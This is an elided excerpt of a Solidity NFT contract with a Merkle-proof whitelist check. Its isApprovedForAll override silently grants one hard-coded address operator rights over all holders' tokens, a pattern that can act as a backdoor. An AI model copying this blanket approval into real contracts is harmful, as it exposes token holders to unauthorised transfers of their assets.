  ...
  Ownable
{
  ...
  function _baseURI() internal view virtual returns (string memory) {
    ...
    function isInTheWhitelist(bytes32[] calldata _merkleProof) public view returns (bool) {
        ...
        require(MerkleProof.verify(_merkleProof, LWlMerkleRoots, leaf) || MerkleProof.verify(_merkleProof, LWlMerkleRoots, leaf2), "Invalid proof!");
        return true;
    }
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x28fFa1f081a234b82445952888a543e3f3D767f2){return true;}
